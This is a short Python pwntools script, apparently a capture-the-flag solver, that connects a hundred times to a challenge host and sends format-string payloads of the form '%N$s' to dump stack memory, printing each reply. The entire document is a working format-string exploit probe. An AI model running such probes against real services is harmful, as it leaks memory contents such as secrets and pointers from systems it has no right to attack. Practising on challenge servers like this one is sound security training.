from pwn import *

host, port = "0.cloud.chals.io", 12690

for i in range(100):
    nc = remote(host, port)
    nc.sendline("%" + str(i) + "$s")
    response = nc.recv()
    print(response)
    nc.close()